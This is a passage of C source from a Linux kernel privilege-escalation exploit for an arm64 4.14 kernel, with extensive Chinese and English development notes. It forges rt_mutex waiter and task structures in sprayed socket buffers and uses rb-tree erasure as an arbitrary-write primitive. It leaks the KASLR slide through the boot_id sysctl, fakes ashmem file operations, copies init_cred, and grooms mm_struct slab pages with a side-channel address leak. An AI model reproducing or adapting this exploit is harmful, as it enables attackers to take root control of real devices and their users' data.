      fake_left = 0;
    }
    binwrite_target = payload_base + SCRATCH_OFF;
  } else {
    fake_parent = data_addr(ASHMEM_MISC_FOPS) - 8;
    fake_right = fake_fops;
    fake_left = payload_base + LEFT_OFF;
    binwrite_target = payload_base + FOPS_OFF + 0x700;
  }

  uintptr_t write_pc = fake_parent;
  uintptr_t write_right = fake_right;
  uintptr_t write_left = fake_left;
  if (pselect_custom_write) {
    /* rb_erase_cached(&fake_w0.pi_tree_entry, &fake_task->pi_waiters)
     * with node->rb_right == 0 takes the single-child path at 0x58ec:
     *   parent = node->__rb_parent_color & ~3
     *   *(parent + 8) = node->rb_left
     * With parent = target-8 and rb_left = 0 this is exactly
     *   *(target) = 0
     * and the trailing `cbz x9` early-returns, so no second write happens.
     * rb_right must be 0: a nonzero value jumps to the successor path at
     * 0x57e0 which dereferences node->rb_left (== 0 here) -> NULL fault. */
    write_pc = pselect_custom_target - 8;
    write_right = 0;
    write_left = 0;
  }
  uint64_t waiter_task = text_addr(INIT_TASK);
  uint64_t task_group = text_addr(ROOT_TASK_GROUP);
  uint64_t pi_top_task = text_addr(INIT_TASK);
  if (pselect_custom_write) {
    /* K40 contract: keep every PI-chain pointer inside the controlled page.
     * text_addr() needs a KASLR slide that run_w1_once never leaks (it pins
     * kaslr_base = KIMAGE_TEXT_BASE), so any image pointer here would be
     * garbage and fault the walk. */
    waiter_task = fake_task;
    task_group = fake_task;
    /* ===== gK64 重大修复：pi_top_task 必须等于 fake_task =====
     * [A-源码] kernel/sched/core.c rt_mutex_setprio():
     *     prio = __rt_effective_prio(pi_task, p->normal_prio);   // pi_task 非空 ⇒ min(p->normal_prio, pi_task->prio)
     *     if (p->pi_top_task == pi_task && prio == p->prio && !dl_prio(prio))
     *         return;                     // ★ 唯一的安全提前返回
     *     否则进入 __task_rq_lock/dequeue_task/put_prev_task 等完整调度器操作，
     *     对伪造的 fake_task 而言必然挂死（sched_class/se/rt 等字段全是垃圾）。
     *
     * [调用链] rt_mutex_adjust_prio(fake_task) 里 pi_task = task_top_pi_waiter(fake_task)->task
     *     task_top_pi_waiter 用 pi_tree_entry 偏移 0x18；w1+0x18/0x20/0x28 全 0
     *     ⇒ rb_entry(rb_leftmost=w1, waiter, pi_tree_entry) = w1
     *     ⇒ pi_task = w1->task = *(w1+0x30) = **fake_task**（waiter_task 已设为 fake_task）
     *   故要让提前返回成立，必须使 fake_task->pi_top_task == fake_task。
     *
     * [旧 bug] 旧代码 `pi_top_task = fake_task;` 后紧跟 `pi_top_task = SLIDE_INIT_TASK;`
     *   把前者覆盖 ⇒ fake_task->pi_top_task = SLIDE_INIT_TASK != pi_task
     *   ⇒ 不提前返回 ⇒ 进完整调度器操作 ⇒ gK63 挂死（第 2 次 HWT，04:51:50）。
     * [配套] fake_task->prio 与 normal_prio 均已写 FAKE_TASK_PRIO(120)，
     *   ⇒ prio = min(120,120) = 120 == p->prio ✓；120 非 dl_prio ✓。
     */
    pi_top_task = fake_task;
  }
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    /* B-mode KASLR leak (Poc-Analysis contract).  rb_erase_cached()
     * branch 0x5838 (rb_left != 0, rb_right == 0) executes
     *     *(node->rb_left) = node->__rb_parent_color
     * so node = {pc = value, right = 0, left = target} performs
     *     *(target) = value
     * with both operands being DIRECT-MAP aliases -> no KASLR needed.
     *
     * target = boot_id ctl_table.data slot  (direct-map alias)
     * value  = loggers[0]                   (direct-map alias)
     * After the write, reading /proc/sys/kernel/random/boot_id returns
     * *(loggers[0]) = nfulnl_logger runtime address -> KASLR slide. */
    write_pc = SLIDE_LOGGERS_0_1;
    write_right = 0;
    write_left = SLIDE_RANDOM_BOOT_ID_DATA;
    waiter_task = SLIDE_INIT_TASK;
    task_group = SLIDE_ROOT_TASK_GROUP;
    pi_top_task = SLIDE_INIT_TASK;
  }

  for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
    unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;

    put32(p, LOCK_OFF + 0x00, 0);
    if (payload_mode == PAGE_PAYLOAD_SLIDE) {
      /* Poc-Analysis SLIDE contract: empty waiter tree, owner = 0. */
      put64(p, LOCK_OFF + 0x08, 0);
      put64(p, LOCK_OFF + 0x10, 0);
      put64(p, LOCK_OFF + 0x18, 0);
    } else {
      /* rb_entry(rb_leftmost, struct rt_mutex_waiter, tree_entry) must land on
       * the waiter base. FAKE_WAITER_* offsets are all waiter+0x20, so the
       * waiter base is fake_w0+0x20. Using bare fake_w0 made w->lock read
       * 0 instead of fake_lock and tripped BUG_ON(w->lock != lock). */
      {
        /* 4.14 rt_mutex_waiter has no tree_prio/tree_deadline, so every
         * FAKE_WAITER_* offset (6.1 layout) sits 0x20 past the real field.
         * rt_mutex_top_waiter() does rb_entry(rb_leftmost, waiter, tree_entry)
         * then BUG_ON(w->lock != lock). Pointing rb_leftmost at the true
         * waiter base (fake_w0+0x20) makes w->lock read fake_w0+0x58 =
         * fake_lock and satisfies the check. */
        /* ===== gK63 重大修复：rb_node / rb_leftmost 改指独立的 w1 槽 =====
         * [根因] 旧代码用 wbase=fake_w0+0x20 打补丁，使 wbase->rb_right 读到
         *   *(fake_w0+0x28)=write_pc（非零）⇒ rt_mutex_enqueue 首轮走 rb_right
         *   ⇒ 从 write_pc 开始沿任意内核内存无界游走 ⇒ 死循环 ⇒ HWT 挂死。
         * [修复] w1 是严格 4.14 布局的独立假 waiter：
         *   w1+0x00/0x08/0x10 全 0（tree_entry 空）
         *   w1+0x18/0x20/0x28 全 0（pi_tree_entry 空）
         *   w1+0x30=fake_task, w1+0x38=fake_lock, w1+0x40=0x7fffffff
         * ⇒ enqueue 首轮 parent=w1, entry->prio=0x7fffffff > waiter->prio
         *   ⇒ 走 w1->rb_left=0 ⇒ *link==0 立即退出（不再游走）
         */
        uintptr_t wbase = fake_w0;
        if (env_flag("WAITER_BASE_4_14", 0)) wbase = fake_w0 + 0x20;
        uintptr_t w1 = payload_base + W1_OFF;
        if (chunk == 0) ckpt_val("waiter_base_off", (long)(wbase - fake_w0));
        if (chunk == 0) ckpt_val("g63_w1", (long)w1);
        put64(p, LOCK_OFF + 0x08, w1);
        put64(p, LOCK_OFF + 0x10, w1);
      }
      /* PIWALK_OWNER_NULL=1: make rt_mutex_owner(fake_lock) return NULL.
       * rtmutex.c:652 -> if (!rt_mutex_owner(lock)) { unlock; return 0; }
       * This makes the PI chain walk terminate cleanly instead of running
       * into the fake task tree and deadlocking. owner=1 is the canonical
       * "has waiters, no owner" encoding (masked by ~RT_MUTEX_HAS_WAITERS). */
      {
        int pon = env_flag("PIWALK_OWNER_NULL", 0);
        if (chunk == 0) ckpt_val("piwalk_owner_null", (long)pon);
        put64(p, LOCK_OFF + 0x18, pon ? 1 : (fake_task | 1));
        if (chunk == 0)
          ckpt_val("pg_lock_owner",
                   (long)(*(uint64_t *)(void *)(p + LOCK_OFF + 0x18)));
      }
    }

    put64(p, W0_OFF + 0x00, 1);
    put64(p, W0_OFF + 0x08, 0);
    put64(p, W0_OFF + 0x10, 0);
    put32(p, W0_OFF + FAKE_WAITER_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
    put64(p, W0_OFF + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);
    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, write_right);
    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
    put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
    put64(p, W0_OFF + FAKE_WAITER_TASK_OFF, waiter_task);
    put64(p, W0_OFF + FAKE_WAITER_LOCK_OFF, fake_lock);
    /* 4.14 has no wake_state: WAKE_STATE_OFF == PRIO_OFF == 0x40.
     * Do not store 0 here or it would clobber the prio just written. */
    put64(p, W0_OFF + FAKE_WAITER_WW_CTX_OFF, 0);
    /* ===== gK63：独立假 waiter 槽 w1（严格 4.14 布局）=====
     * 字段偏移写死为 4.14 真实值，不依赖 FAKE_WAITER_*（那套是 6.1 布局）。
     *   +0x00 tree_entry.pc   = 0   （黑，避免 rb_insert 重平衡）
     *   +0x08 tree_entry.right= 0
     *   +0x10 tree_entry.left = 0   （enqueue 首轮 *link==0 即退出）
     *   +0x18 pi_tree.pc      = 0   （RB_EMPTY_NODE 成立，dequeue_pi 直接 return）
     *   +0x20 pi_tree.right   = 0
     *   +0x28 pi_tree.left    = 0
     *   +0x30 task            = fake_task
     *   +0x38 lock            = fake_lock（过 BUG_ON(w->lock != lock)）
     *   +0x40 prio            = 0x7fffffff（> waiter->prio，使遍历走 rb_left）
     *   +0x48 deadline        = 0
     */
    put64(p, W1_OFF + 0x00, 0);
    put64(p, W1_OFF + 0x08, 0);
    put64(p, W1_OFF + 0x10, 0);
    put64(p, W1_OFF + 0x18, 0);
    put64(p, W1_OFF + 0x20, 0);
    put64(p, W1_OFF + 0x28, 0);
    put64(p, W1_OFF + 0x30, fake_task);
    put64(p, W1_OFF + 0x38, fake_lock);
    put32(p, W1_OFF + 0x40, 0x7fffffff);
    put64(p, W1_OFF + 0x48, 0);

    put32(p, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, 0x100);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
    if (payload_mode == PAGE_PAYLOAD_FOPS) {
      if (pselect_custom_write) {
        /* Empty pi_waiters: erase uses W0's parent pointers (not root),
         * re-insert finds empty tree → sole root → no rebalancing.
         * This prevents the insert from touching selinux_state. */
        put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
        put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
      } else {
        put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
        put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
      }
    } else {
      /* ===== gK85 修复（2026-10-23，A20 定案）：不再预置 pi_waiters =====
       * [B-源码] kernel/locking/rtmutex.c:1126 rt_mutex_adjust_pi() 调用
       *     rt_mutex_adjust_prio_chain(task, RT_MUTEX_MIN_CHAINWALK, NULL,
       *                                next_lock, NULL, task);
       *                                                     ↑orig_waiter = NULL
       * [B-源码] rtmutex.c:459
       *     struct rt_mutex_waiter *waiter, *top_waiter = orig_waiter;  // NULL
       * [B-源码] rtmutex.c:538
       *     if (top_waiter) {                       // NULL ⇒ 整块跳过
       *         if (!task_has_pi_waiters(task)) goto out_unlock_pi;
       *         ...
       *     }
       * ⇒ sched_setattr 路径（orig_waiter=NULL）从不执行 task_has_pi_waiters /
       *   task_top_pi_waiter ⇒ fake_task->pi_waiters 在这条路径上完全不被读。
       *
       * 唯一会读它的是 rtmutex.c:340 rt_mutex_adjust_prio()，
       * 而它只在 [11] requeue 分支被调用；[11] 三个分支对当前几何都不成立
       * （waiter=悬空真waiter，top=w1，两者互不相等）⇒ adjust_prio 不被调用。
       *
       * [旧做法的隐患] 旧代码写 fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF(0x28)，
       * 即 rb_root.rb_node 非 0、rb_leftmost(offset 8) 为 0。若哪天 adjust_prio
       * 真被触发：task_top_pi_waiter = rb_entry(0, waiter, pi_tree_entry)
       *   = 0 - 0x18 = -0x18 ⇒ pi_task = *(-0x18 + 0x30) = *0x18 ⇒ 必崩。
       * 故统一清 0（与 FOPS 分支一致），消除该隐患。 */
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
    }
    put64(p, FAKE_TASK_OFF + FAKE_TASK_TASK_GROUP_OFF, task_group);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF, pi_top_task);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);

    put64(p, RIGHT_OFF + 0x00, fake_parent);
    put64(p, RIGHT_OFF + 0x08, 0);
    put64(p, RIGHT_OFF + 0x10, 0);

    put64(p, LEFT_OFF + 0x00, fake_parent);
    put64(p, LEFT_OFF + 0x08, 0);
    put64(p, LEFT_OFF + 0x10, 0);

    if (payload_mode == PAGE_PAYLOAD_FOPS) {
      put_fake_fops_table(p, FOPS_TABLE_OFF);
      if (pselect_custom_write >= 2) {
        fill_init_cred_copy(p, CRED_COPY_OFF);
      }
    }
  }
  return 1;
}

uintptr_t prepare_kernel_page(int payload_mode) {
  close_reclaim_sockets();
  /* gK87 观测点 0：进入函数时的基线 */
  ckpt_val("slab_baseline", meminfo_slab_kb());
  ckpt_val("sunreclaim_baseline", meminfo_sunreclaim_kb());
  ckpt_val("free_baseline", meminfo_free_kb());
  /* ===== 重建128（gK30）：mm_struct_sz 允许运行时覆盖 =====
   * [反汇编] mm_alloc @ 0xffffff80080b1e10 用 __memset(mm, 0, 0x360) 清零，
   * 故 sizeof(struct mm_struct) == 0x360（不是 offsets.h 里 TODO verify 的 0x500）。
   * mm_cachep 若带 SLAB_HWCACHE_ALIGN，实际 slab 对象步长可能是 0x380。
   * 用 MM_SZ 环境变量直接覆盖，避免反复重编译即可二分验证。 */
  size_t mm_sz = (size_t)env_ulong("MM_SZ", MM_STRUCT_SZ);
  if (mm_sz < 0x100 || mm_sz > 0x2000) mm_sz = MM_STRUCT_SZ;
  mm_objs_per_slab = ORDER3_SIZE / mm_sz;
  pr_info("GK30: mm_struct_sz=%#zx (offset table=%#x) objs_per_slab=%zu\n",
          mm_sz, (unsigned)MM_STRUCT_SZ, mm_objs_per_slab);
  prepare_ctxs();

  skb_buf = malloc(SKB_SEND_SIZE);
  memset(skb_buf, 0x41, SKB_SEND_SIZE);

  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    prepare_ctx.childs[i] = clone_child();
    prepare_ctx.memfds[i] = open_memfd(prepare_ctx.childs[i]);
  }

  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    spray_ctx.childs[i] = clone_child();
    spray_ctx.memfds[i] = open_memfd(spray_ctx.childs[i]);
  }

  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  ks = kernelsnitch_setup(
      mm_sz, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, env_flag("KS_VERBOSE", 0), 0);

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    pre_ctx.childs[i] = clone_child();
  }
  child_leak = clone_leak_child();
  /* ===== gK108 (A150)：钉住 child_leak 的 mm_struct，让 base 页全程保持 full =====
   * [时机] 必须在 waitpid(child_leak) 之前 open。此处 open 后 mm_count=2，
   *   child_leak 子进程 exit(0) 时 mm_users→0 但 mm_count=1 ⇒ mm_struct 不 free。
   * [几何] base 页 36 个对象 = pre_ctx 末 8 个 + child_leak 1 个 + post_ctx 前 27 个。
   *   故 post_ctx 分配完成后 base 页才变 full（inuse=36），此时它不在任何 partial 链表，
   *   后续全部 fork churn（F1/drain/pre_fork/post_f1 ≈2880 次）都抢不走它。
   */
  gk_ctx_late = env_flag("GK_CTX_LATE", 0);
  if (gk_ctx_late) {
    leak_memfd = open_memfd(child_leak);
    ckpt_val("g108_ctx_late", 1);
    ckpt_val("g108_leak_memfd", (long)leak_memfd);
  } else {
    ckpt_val("g108_ctx_late", 0);
  }
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    post_ctx.childs[i] = clone_child();
  }

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    pre_ctx.memfds[i] = open_memfd(pre_ctx.childs[i]);
  }
  /* V3: 不再 open("/proc/child_leak/mem")。
   * 该 fd 会 mmgrab 子进程的 mm_count，使子进程 exit 后 mm_struct 仍不释放，
   * 从而 base 页 inuse 无法归零。V3 需要子进程 mm 真正 free_mm。 */
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    post_ctx.memfds[i] = open_memfd(post_ctx.childs[i]);
  }

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    kill_child(pre_ctx.childs[i]);
  }
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    kill_child(post_ctx.childs[i]);
  }
  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    kill_child(spray_ctx.childs[i]);
  }
  SYSCHK(waitpid(child_leak, NULL, 0));

  /* V3: 子进程已跑完 find_collisions + bruteforce，state 现在是 MM_FOUND/MM_NOT_FOUND，
   * 不能再调用 kernelsnitch_found_collisions（其 ASSERT 只接受 COLLISIONS_* 状态）。
   * 直接以 ks->mm_struct 是否有效作为成功判据。 */
  if (ks->mm_struct == 0 || ks->mm_struct == (size_t)-1) {
    pr_warning("KernelSnitch mm_struct leak failed\n");
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }

  /* V3: bruteforce 已在 child_leak 子进程内完成（见 clone_leak_child）。
   * 子进程写入的是自己的 mm_struct 地址（通过 MAP_SHARED 的 ks 传回）。
   * 这里只读取结果，不再在主进程重复 bruteforce —— 否则又会得到主进程的 mm。 */
  uintptr_t leaked = ks->mm_struct;
  last_mm_struct = leaked;
  if (leaked == (uintptr_t)-1) {
    pr_warning("KernelSnitch mm_struct leak failed\n");
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }

  uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
  /* Sanity guard: the sprayed page must live in kernel space. On some ports
   * KernelSnitch's mm_struct leak returns a bogus (user-range) address; using
   * it builds fake_lock/fake_task at invalid addresses and the PI walk then
   * dereferences garbage -> kernel panic. Bail out instead of crashing. */
  /* ===== 重建128（gK30）：DRAM 上界 sanity guard =====
   * KernelSnitch 的 __mm_leak 只做 futex_hash 算术比对，全程不读候选地址，
   * 因此会把根本不存在物理页的地址当结果返回。
   * [实测] 本机 MemTotal=7.34GiB；r115 泄漏反推 base=0xffffff82e80b0000
   *        → 物理偏移 11.6GiB，远超 DRAM → 未映射 → trylock 的 ldaxr 读崩。
   * 故必须按「物理偏移 < DRAM 上限」再拦一道。
   * DRAM_LIMIT 默认 8GiB（环境变量 GK30_DRAM 可覆盖，单位字节，十六进制）。 */
  /* ===== 重建142（gK39）：修正 DRAM guard —— 必须加回 P0_PHYS_OFFSET =====
   * [★ 实测抓到的错误] r127/gK38:
   *   base = 0xffffff81d54e8000
   *   旧算法 phys_off = base - PAGE_OFFSET = 0x1d54e8000 = 7.333 GiB < 8GiB -> 放行 ✗
   *   但 direct map 是 VA = PAGE_OFFSET + (PA - P0_PHYS_OFFSET)，故：
   *     真实 PA = (base - PAGE_OFFSET) + P0_PHYS_OFFSET
   *             = 0x1d54e8000 + 0x40000000 = 0x2154e8000 = 8.333 GiB
   *   而 MemTotal = 7692468 kB = 0x1d582d000 = 7.336 GiB
   *   => 真实 PA 8.333GiB > DRAM 7.336GiB，物理页不存在 -> 未映射 -> ldaxr 读崩。
   * 根因：旧 guard 漏了 P0_PHYS_OFFSET(0x40000000 = 1GiB)，阈值差 1GiB，
   *       导致所有 [7GiB, 8GiB) 的越界地址全部被放行。
   * 修正：phys_off 加上 P0_PHYS_OFFSET，与真实物理地址对齐。
   * 阈值改为 DRAM 实测大小（0x1d582d000），可用 GK30_DRAM 覆盖。 */
  /* gK62：dram_limit 已不参与判定（memstart_addr 未知，PA 无法反推）。
   * 保留环境变量 GK30_DRAM 仅为兼容旧脚本，不再读取。 */
  /* ===== gK58（重做 gK56）：bogus 校验必须适应 KASLR =====
   * [A-实测] gK55 主流程命中 0xffffffd7c7e5ec80，slab内偏移 0x6c80 = 0x380*30 ✓ 真值，
   *   但旧式 phys_off = base - P0_PAGE_OFFSET + P0_PHYS_OFFSET 算出 352GiB 的荒谬值
   *   -> 误判 bogus 中止。
   * [B-源码] arm64 KASLR 平移 memstart_addr，线性映射基址随每次启动漂移：
   *   VA = PAGE_OFFSET + (PA - memstart_addr)，PAGE_OFFSET 固定 0xffffffc000000000。
   * [A-实测] gk56_lin = base - 0xffffffc000000000 实测 0x17d2d08000 (95.3GiB)，
   *   gK56 用 P0_PAGE_OFFSET 作基准时算出 0x582dfb8000 -> 错。改用真实 PAGE_OFFSET。
   * 判据：lin ∈ [P0_PHYS_OFFSET, DRAM + KASLR容差(128GiB)) 则放行。
   */
  /* ===== gK62：PA guard 彻底重写（A 级静态定案，推翻 gK58 的 128GiB 假设）=====
   * [A-源码] arch/arm64/mm/init.c:491-505（本机 4.14.186 源码）:
   *     range = linear_region_size - (memblock_end_of_DRAM() - start_of_DRAM());
   *     if (seed > 0 && range >= ARM64_MEMSTART_ALIGN) {
   *         range /= ARM64_MEMSTART_ALIGN;
   *         memstart_addr -= ARM64_MEMSTART_ALIGN * ((range * seed) >> 16);
   *     }
   * [A-源码] ARM64_MEMSTART_ALIGN：ARM64_MEMSTART_SHIFT=PUD_SHIFT=30(4K页)，
   *     SECTION_SIZE_BITS=30，条件 30<30 为假 ⇒ ALIGN = 1<<30 = 1GiB
   *     （不是 SECTION_SIZE 那条分支）。
   * [A-计算] linear_region_size = BIT(VA_BITS-1) = 256GiB（init.c:420/430 BUILD_BUG_ON）
   *     range = 256GiB - 7.336GiB = 248.66GiB；range/1GiB = 248
   *     seed(u16) 最大 65535 ⇒ (248*65535)>>16 = 247
   *     ⇒ memstart_addr 最多下移 **247GiB**，gK58 假设的 128GiB 上限是错的。
   *
   * [A-实测 gK61] 泄漏候选 lin=0x33f6218000=223.16GiB，被旧 guard(135GiB) 误杀。
   *   该候选同时满足：tol_hits=1(唯一) / best_hits=4(满分) / 页内偏移 0x1f80 % 0x380==0
   *   ⇒ 几乎确定就是真 mm_struct。
   *
   * [结论] lin = VA - PAGE_OFFSET = PA - memstart_addr，memstart_addr 未知（被 KASLR 随机化），
   *   因此 **lin - P0_PHYS_OFFSET 不是物理地址，任何基于它的下/上界都无意义**。
   *   唯一有效的硬边界是 linear map 自身的容量：lin ∈ [0, 256GiB)。
   *   这仍能拦掉落在 VMEMMAP/MODULES 区的荒谬地址（gK38 的 352GiB 会被拦）。
   */
  uint64_t lin = (uint64_t)base - 0xffffffc000000000ULL;
  uint64_t lin_max = (uint64_t)env_ulong("GK58_LIN_MAX", 0x4000000000ULL); /* 256GiB = BIT(VA_BITS-1) */
  int phys_ok = (lin < lin_max);
  uint64_t phys_off = lin;
  ckpt_val("gk58_lin", (long)lin);
  ckpt_val("gk58_lin_max", (long)lin_max);
  ckpt_val("gk58_phys_ok", phys_ok ? 1 : 0);
  if (base < 0xffff000000000000ULL || !phys_ok) {
    pr_error("KernelSnitch leak bogus: mm_struct=0x%016zx base=0x%016zx "
             "lin=0x%llx lin_max=0x%llx — aborting this attempt\n",
             leaked, base, (unsigned long long)phys_off,
             (unsigned long long)lin_max);
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }
  if (!prepare_skb_payload(base, payload_mode)) {
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }

  /* gK92: open N socketpairs. Each has its own 16MB sk_sndbuf => ~251 sends. */
  int reclaim_sockets = env_int_range("GK38_SOCKETS", 1, 1, MAX_RECLAIM_SOCKETS);
  ckpt_val("g38_sockets", (long)reclaim_sockets);
  for (int si = 0; si < reclaim_sockets; si++) {
    SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv[si]));
  }
  /* ===== 重建141（gK38）：提高 sndbuf + 校验实际生效值 =====
   * 原值 1MB，每次 sendmsg 发 64KB(SKB_SEND_SIZE=0x10000)，原 SKB_RECLAIM_SENDS=4
   * 只用掉 256KB；而前面释放了约 39 个 order-3 slab 页（prepare 32 + spray 6 + pre/post），
   * 重占覆盖率仅 ~20%。要提高次数必须先提 sndbuf，否则 sendmsg 会 EAGAIN 提前 break。
   * 另：原代码不检查 setsockopt 返回值，内核可能把 sndbuf 钳到 wmem_max。这里回读确认。 */
  int sndbuf = env_int_range("GK38_SNDBUF_KB", 8192, 256, 65536) * 1024;
  for (int si = 0; si < reclaim_sockets; si++) {
    if (setsockopt(reclaim_sv[si][0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf)) != 0)
      pr_warning("GK38: SO_SNDBUF set failed errno=%d\n", errno);
    { int got = 0; socklen_t gl = sizeof(got);
      if (getsockopt(reclaim_sv[si][0], SOL_SOCKET, SO_SNDBUF, &got, &gl) == 0)
        pr_info("GK38: sock%d sndbuf want=%d got=%d\n", si, sndbuf, got); }
    int reclaim_flags = fcntl(reclaim_sv[si][0], F_GETFL, 0);
    if (reclaim_flags >= 0) {
      fcntl(reclaim_sv[si][0], F_SETFL, reclaim_flags | O_NONBLOCK);
    }
  }
  int pcp_shaping_sv[2];
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_shaping_sv));

  struct iovec iov;
  memset(&iov, 0, sizeof(iov));
  iov.iov_base = skb_buf;
  iov.iov_len = SKB_SEND_SIZE;

  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  SYSCHK(sendmsg(pcp_shaping_sv[0], &msg, 0));

  pin_to_core(CORE);
  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  /* ===== gK91 (A50): pre_ctx release timing switch =====
   * [A50 static] base page belongs to pre_ctx, NOT prepare_ctx:
   *   alloc order: prepare(48 slab) -> spray(6) -> pre(objs-1) -> child_leak(1) -> post(objs)
   *   pre_ctx = objs-1 and child_leak follows it => together they fill
   *   exactly ONE order-3 slab page => that page IS base page.
   * [sequence] waitpid(child_leak) => inuse = objs-1 (pre_ctx still alive)
   *   kill_child(pre_ctx) does NOT free the mm: parent holds /proc/pid/mem,
   *   so mm_count=2 and mmdrop only reaches 1.
   *   Only close(pre_ctx.memfds) drives mm_count 1->0 => free_mm => inuse=0.
   * [A45 was wrong] A45 deferred prepare_ctx, a different ctx. Worse, its
   *   48 freshly freed slabs went to buddy HEAD right before sendmsg,
   *   pushing base page deeper. That is why 1004 sends still missed (run7).
   * [A50 fix] defer pre_ctx close to AFTER drain, right before sendmsg,
   *   so base page enters buddy LAST => list_add(HEAD) => 1st sendmsg gets it.
   * [switch] PRE_CTX_DEFER=1 enables (default 0 = old behaviour).
   *   Must be combined with A45_DEFER=0.
   */
  int pre_ctx_defer = env_flag("PRE_CTX_DEFER", 0);
  ckpt_val("pre_ctx_defer", (long)pre_ctx_defer);
  /* gK103 (A123)：pre_fork 的 pid 数组提升到函数作用域，
   * 以便把 kill 推迟到 post_f1 之后、紧邻 sendmsg 之前（GK_PRE_FORK_LATE=1）。 */
  pid_t *pref_pids = NULL;
  int pref_n = 0;
  if (!pre_ctx_defer) {
    for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
      if (pre_ctx.memfds[i] > 0) {
        SYSCHK(close(pre_ctx.memfds[i]));
        pre_ctx.memfds[i] = -1;
      }
    }
    ckpt_val("pre_ctx_release_at", 1);
  } else {
    ckpt_val("pre_ctx_release_at", 2);
  }
  /* ===== gK87 修复（2026-10-23，A23 静态定案）：post_ctx / spray_ctx 必须全关 =====
   * [B-源码] fs/proc/base.c proc_mem_open():
   *     mm = mm_access(task, ...);   → get_task_mm → mmget (mm_users++)
   *     mmgrab(mm);                  → ★ mm_count++
   *     mmput(mm);                   → mm_users--（抵消 mmget）
   *   fs/proc/base.c mem_release():
   *     if (mm) mmdrop(mm);          → mm_count--，仅 close(fd) 时执行
   * ⇒ open("/proc/<pid>/mem") 使 mm_count 永久 +1，只有 close(fd) 才减回。
   *
   * [旧 bug 1] post_ctx 原来是 `i < mm_cnt - 1`，故意少关最后 1 个，
   *   导致那 1 个 mm_struct 的 mm_count 永不归零 ⇒ 该页 inuse 恒为 1 ⇒ 永不 discard。
   * [旧 bug 2] spray_ctx 原来是 `i += mm_objs_per_slab`，i 只取 0,36,...,180
   *   ⇒ **216 个里只关 6 个**，剩 210 个 mm_count 不归零
   *   ⇒ 6 个 slab 页 inuse 恒为 30 ⇒ 永不 discard。
   *
   * [修法] 全部全关，并加 `> 0` 保护（open_memfd 失败时返回 -1，
   *   close(-1) 会 EBADF 刷屏；close_ctx_memfds 原本就有这层保护）。
   */
  /* ===== gK108 (A150)：GK_CTX_LATE=1 时推迟到所有 fork churn 之后 =====
   * [为何必须推迟] base 页此时 inuse=36（full，因 leak_memfd 钉住）。
   *   若现在 close(post_ctx)，base 36->9，prior==NULL ⇒ 首次冻结 ⇒ 进 c->partial。
   *   而 c->partial 头页会被 ___slab_alloc 优先取走（new_slab 标签）
   *   ⇒ 后面 F1/drain/pre_fork/post_f1 的 fork 立刻把 base 页抢回并填满 ⇒ 前功尽弃。
   * [推迟后] 保持 full，full 页不在任何 partial 链表 ⇒ fork 抢不走。
   */
